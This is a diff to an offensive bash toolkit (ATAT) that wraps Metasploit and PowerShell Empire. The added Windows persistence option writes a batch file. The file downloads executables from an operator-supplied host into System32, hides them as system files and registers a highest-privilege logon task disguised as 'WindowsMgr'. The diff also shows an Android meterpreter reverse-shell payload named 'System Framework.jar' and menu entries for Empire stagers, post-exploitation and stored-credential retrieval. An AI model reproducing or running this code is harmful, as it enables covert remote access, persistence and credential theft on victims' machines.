@@ -332,8 +332,8 @@ done
 echo -e "\E[1;34m::::: \e[97mPersistence Generator \E[1;34m:::::"
 echo -e "\E[1;34m::::: \e[97mBind Shells are a Work in Progress \E[1;34m:::::"
 echo -e "\E[1;34m::::: \e[97mThanks to Skysploit for the DBD Builder!! \E[1;34m:::::"
-PS3='Enter your choice: ENTER=Options Menu | 6=Main Menu | 7=QUIT: '
-options=("Windows DBD Reverse Shell" "Windows DBD Bind Shell" "Linux/NetBSD/FreeBSD/OpenBSD DBD Reverse Shell" "Linux/NetBSD/FreeBSD/OpenBSD DBD Bind Shell" "Android" "Main Menu" "Quit")
+PS3='Enter your choice: ENTER=Options Menu | 7=Main Menu | 8=QUIT: '
+options=("Windows DBD Reverse Shell" "Windows DBD Bind Shell" "Linux/NetBSD/FreeBSD/OpenBSD DBD Reverse Shell" "Linux/NetBSD/FreeBSD/OpenBSD DBD Bind Shell" "DBD Reboot Persistence Generator - Windows" "Android" "Main Menu" "Quit")
 select opt in "${options[@]}"
 do
     case $opt in
@@ -523,6 +523,17 @@ do
 		read -p "Press any key to contiue" enter
 		clear
 	        ;;
+	    "DBD Reboot Persistence Generator - Windows")
+        read -p 'Set LHOST IP or Domain Name & Port (if necessary i.e., 1.1.1.1 OR 1.1.1.1:8080): ' userhost;
+			touch  ~/ATAT/DBD_reboot.bat
+			echo powershell \(new-object System.Net.WebClient\).DownloadFile\(\'http://$userhost/winmgnt.txt\',\'%WINDIR%\\System32\\winmgnt.exe\'\) > ~/ATAT/DBD_reboot.bat
+			echo powershell \(new-object System.Net.WebClient\).DownloadFile\(\'http://$userhost/taskmgnt.txt\',\'%WINDIR%\\System32\\taskmgnt.exe\'\) >> ~/ATAT/DBD_reboot.bat
+			echo attrib +H +S \"%WINDIR%\\System32\\winmgnt.exe\" >> ~/ATAT/DBD_reboot.bat
+			echo attrib +H +S \"%WINDIR%\\System32\\\taskmgnt.exe\" >> ~/ATAT/DBD_reboot.bat
+			echo %WINDIR%\\System32\\\taskmgnt.exe -i -d -s /accepteula %WINDIR%\\System32\\winmgnt.exe >> ~/ATAT/DBD_reboot.bat
+			echo schtasks /create /sc onlogon /tn WindowsMgr /rl highest /tr \"%WINDIR%\\System32\\winmgnt.exe\" >> ~/ATAT/DBD_reboot.bat
+            echo -e "\E[1;34m::::: \e[97mDBD_reboot.bat saved to ~/ATAT. Upload to device and run.\E[1;34m:::::" 
+            ;; 
         "Android")
         read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport;
 			msfvenom -f raw -p android/meterpreter/reverse_https LHOST=$userhost LPORT=$userport -o "System Framework.jar"
@@ -829,43 +840,9 @@ select opt in "${options[@]}"
         *) echo invalid option;;
     esac
 done
+
 ;;
   
-#   "8" | "8" )
-          
-#echo -e "\E[1;34m::::: \e[97mScan All The Things!!\E[1;34m:::::"
-
-#PS3='Enter your choice: ENTER=Options Menu | 2=Main Menu | 3=QUIT: '
-#options=("Options" "Quit")
-#select opt in "${options[@]}"
-#do
-#    case $opt in
-#       "Options")
-#          read -p 'Set MODULE_PATH: ' usermodule; read -p 'Set RHOSTS: ' usertarget;
-#	inputfile=~/ATAT/MSF_AUX_target_ports.txt
-
-#	for PORT in $(cat $inputfile)
-#	do
-#	msfconsole -x "use $usermodule;\
-#	set RHOSTS $usertarget;\
-#	set RPORT $PORT;\
-#	run;\
-#	exit"
-#	done
-#           echo -e "\E[1;34m::::: \e[97mAll Targets Have Been Scanned\E[1;34m:::::"
-#           ;;
-#        "Main Menu")
-#           ~/ATAT/ATAT.sh
-#           ;;
-#        "Quit")
-#            echo "Aufiederszehn" && exit 1
-#            ;;
-#        *) echo invalid option;;
-#    esac
-#done
-
-#;;
-   
 "8" | "8" )
   # Accept upper or lowercase input.
   echo -e "\E[1;34m::::: \e[97mCheck for Dependencies\E[1;34m:::::"
@@ -900,7 +877,7 @@ do
 		mkdir /tmp/ATAT/
 		echo ""
 
-	reqs="gcc gcc-mingw-w64-i686 curl"
+	reqs="gcc gcc-mingw-w64-i686 curl jq"
 	for i in $reqs; do
 		dpkg -s "$i" &> /tmp/ATAT/$i-install.txt
 		isinstalled=$(cat /tmp/ATAT/$i-install.txt | grep -o "Status: install ok installed")
@@ -974,12 +951,13 @@ done
    "9" | "9" )
           
 echo -e "\E[1;34m::::: \e[97mPowershell Empire & DeathStar \E[1;34m:::::"
+echo -e "\E[1;34m::::: \e[97mEmpire & DeathStar MUST be installed in /root/!! \E[1;34m:::::"
 echo -e "\E[1;34m::::: \e[97mTHIS SECTION ONLY WORKS FROM THE /root/ CONTEXT!! \E[1;34m:::::"
 echo -e "\E[1;34m::::: \e[97mIF YOU'RE NOT LOGGED IN AS root, DO NOT USE THESE OPTIONS!! \E[1;34m:::::"
-echo -e "\E[1;34m::::: \e[97mEmpire & DeathStar MUST be installed in /root/!! \E[1;34m:::::"
+echo -e "\E[1;34m::::: \e[97mOnly Launch DeathStar (Step 2) If Your Goal Is To Automate Domain Admin Credential Acquisition \E[1;34m:::::"
 
-PS3='Enter your choice: ENTER=Options Menu | 3=Main Menu | 4=QUIT: '
-options=("Step 1 - Launch Powershell Empire & RESTful API" "Step 2 - Launch DeathStar" "Main Menu" "Quit")
+PS3='Enter your choice: ENTER=Options Menu | 18=Main Menu | 19=QUIT: '
+options=("Step 1 - Launch Powershell Empire & RESTful API" "Step 2 - Launch DeathStar (Optional)" "Step 3 - Acquire PSE REST API Permanent Token" "Start PSE Listener" "Get PSE Stagers" "Get PSE Agents" "Rename PSE Agent" "Generate PSE Stagers - Windows (mostly)" "Generate PSE Stagers - Windows/OSX/Linux" "Generate PSE Stagers - Windows Office File & CSharp Payload" "Windows Post-Exploitation" "Linux/OSX Post-Exploitation" "Get PSE Stored Credentials" "Kill PSE Listener" "Kill All PSE Listeners" "Restart PSE RESTful API" "Shutdown PSE RESTful API" "Main Menu" "Quit")
 select opt in "${options[@]}"
 do
     case $opt in
